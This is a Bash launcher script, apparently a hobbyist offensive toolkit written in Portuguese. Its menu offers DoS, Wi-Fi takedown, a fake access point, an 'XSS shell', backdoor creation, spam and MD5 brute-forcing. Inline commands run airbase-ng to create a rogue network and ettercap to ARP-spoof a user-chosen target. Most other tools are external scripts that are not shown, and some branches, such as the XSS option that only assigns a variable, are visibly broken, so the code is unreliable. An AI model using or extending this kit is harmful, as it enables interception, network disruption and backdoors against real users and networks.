#!/bin/bash
#ferramenta feita por H7X

clear

echo "      #############"
echo "    ##############*##"
echo "   ################**#"
echo "  ########  #  ####***#"
echo " ########       ###****#"
echo "##########     ####*****#"
echo "####   ##### #####   ***#"
echo "###      #######      **#"
echo "###   X   #####   X   **#"
echo "####     ## # ##     ***#"
echo "########## ### ##*******#"
echo " ### ############**# ###"
echo "     ##-#-#-#-#-#-##"
echo "      | | | | | | |"
echo "V:1.8"
menu="
{0} sair do script
{1} encontrar portas abertas em ip		{7} Ataque Dos
{2} Rastrear ip					{8} Derrubar Wifi
{3} Ativar modo monitor				{9} criar rede wifi fake
{4} Shell em XSS				{10} Criar backdoor automaticamente
{5} Descriptografar MD5				{11} arp_spoof
{6} Spam-Bot
"
echo "$menu"

read -p "Escolha uma opção >> " opcao

case "$opcao" in
	0)
		echo "tchau (^_^)／"
		exit 1
	;;

	1)
		scan=bash requisitos/scanport.sh
	;;


	2)
		ipinfo=bash requisitos/ipinfo.sh
	;;

	3)
		read -p "Sua interface: " ifacemonitor
		airmon-ng start $ifacemonitor
	;;

	4)
		XSS=requisitos/shellxss.py
	;;

	5)
		echo "Essa descriptografia é feita com brute force"
		echo "Então não garanto que você ira conseguir descriptografar"
		echo "tenha uma Wordlist instalada"
		read -p "Hash: " hash
		read -p "caminho da wordlist: " word
		php requisitos/md5b.php -f $word -v $hash
	;;

	6)
		cd requisitos/
		python3 SpamBot.py
		cd ..
	;;

	7)
		DOS=bash requisitos/DosConfig.sh
	;;

	8)
		wifidos=bash requisitos/WifiDos.sh
	;;

	9)
		echo "Recomendo usar a interface wlan0mon"
		read -p "Sua Interface: " interface
		read -p "Canal onde sua rede vai ficar ospedada: " canal
		read -p "Nome da Rede: " Rede
		airbase-ng $interface -c $canal -e $Rede
	;;

	10)
		cd requisitos/creat-backdoor
		./back7.sh
	;;

	11)
mensagem="
esse ataque não funciona em sites com
proteção https"
		echo "$mensagem"
		read -p "Presione {Enter} para continuar"
		figlet arp_spoof
		read -p "Digite sua interface: " arpiface
		read -p "Digite o ip do alvo: " iparp
		clear
		cat requisitos/creat-backdoor/cat-ascii
		echo " "
		sleep 0.70
		echo "Iniciando ataque..."
		echo "precione {Ctrl c} para parar o ataque"
		ettercap -T -q -i $arpiface -P arp_spoof -M arp /$iparp//
	;;

	*)
		echo -e "\e[33m[!]Opção invalida"
	;;

esac
